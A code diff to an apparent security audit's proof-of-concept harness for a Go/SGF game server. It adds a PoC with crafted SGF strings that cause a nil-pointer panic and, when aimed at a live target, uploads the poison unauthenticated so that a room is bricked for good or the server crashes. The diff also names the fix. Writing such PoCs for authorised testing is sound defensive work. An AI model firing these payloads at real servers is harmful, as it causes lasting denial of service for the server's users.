@@ -1124,6 +1124,44 @@ func pocCS1() {
 // panic is in the request goroutine (recovered -> server survives), but the
 // ROOM is unrecoverable; if the room has the OGS plugin active it escalates to a
 // whole-server crash (generateMarks runs in the OGS goroutine).
+// B2: empty/invalid TR or SQ mark field -> nil-deref in GenerateFullFrame.
+// A sibling of B1 with a distinct root cause: generateMarks does
+// cs.Add(coord.FromLetters(v)) and FromLetters returns nil for any value whose
+// length != 2, while CoordSet.Add derefs c.Index() with no nil-check
+// (coord.go:44). FromSGF commits the state before frame generation, so the
+// poison persists (ToSGFIX writes SQ[]/TR[] back) and re-bricks the room on
+// every join/reload; whole-server crash if the room's OGS plugin is active.
+func pocB2() {
+	banner("b2", "Empty/invalid TR/SQ mark = persistent poison-pill (nil-deref in GenerateFullFrame)")
+	for _, sgf := range []string{"(;GM[1]FF[4]SZ[19]SQ[])", "(;GM[1]FF[4]SZ[19]TR[])", "(;GM[1]FF[4]SZ[19]SQ[!])"} {
+		func() {
+			defer func() {
+				if r := recover(); r != nil {
+					fmt.Printf("  %-28q -> GenerateFullFrame PANIC: %v\n", sgf, r)
+				}
+			}()
+			s, err := state.FromSGF(sgf)
+			if err != nil {
+				fmt.Printf("  %-28q -> FromSGF err: %v\n", sgf, err)
+				return
+			}
+			_ = s.GenerateFullFrame(state.Full)
+			fmt.Printf("  %-28q -> no panic (unexpected)\n", sgf)
+		}()
+	}
+	if target != "" {
+		b64 := base64.StdEncoding.EncodeToString([]byte("(;GM[1]FF[4]SZ[19]SQ[])"))
+		resp, err := http.Post("http://"+target+"/api/v1/room/poc-b2", "application/json",
+			strings.NewReader(event("upload_sgf", fmt.Sprintf("%q", b64))))
+		if err == nil {
+			_ = resp.Body.Close()
+			fmt.Println("e2e: uploaded (;SQ[]) to room poc-b2 — it now bricks on every join (and persists).")
+		}
+	}
+	fmt.Println(">> CONFIRMED: unauthenticated upload_sgf with an empty TR/SQ mark permanently bricks the room;")
+	fmt.Println(">> same class as B1/LB. Fix: nil-check in CoordSet.Add and skip nil coords in generateMarks.")
+}
+
 func pocB1() {
 	banner("b1", "Colon-less LB label = persistent poison-pill (unrecoverable board)")
 	sgf := "(;GM[1]FF[4]SZ[19]LB[z])" // LB value has NO colon
@@ -1241,6 +1279,7 @@ var pocs = []struct {
 	{"h6", "NGF/SGF board size — MITIGATED, not exploitable (see C-3)", pocH6},
 	{"h7", "Tree toSGF stack overflow (CONFIRMED whole-server crash, elevated to Critical)", pocH7},
 	{"b1", "[pass2] Colon-less LB label poison-pill — unrecoverable board (CONFIRMED)", pocB1},
+	{"b2", "[fuzz] Empty TR/SQ mark poison-pill — nil-deref in GenerateFullFrame (CONFIRMED)", pocB2},
 	{"a1", "[pass2] Board.Set nil/OOB via OGS goroutine — whole-server crash (CONFIRMED)", pocA1},
 	{"m2", "[medium] Unbounded HTTP request body", pocM2},
 	{"m3", "[medium] /debug leaks room state unauthenticated (CONFIRMED)", pocM3},
@@ -1271,7 +1310,7 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1 nick authleak sgfesc id1  (h6 verifies a mitigation)")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 b2 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1 nick authleak sgfesc id1  (h6 verifies a mitigation)")
 	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1 id3")
 	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
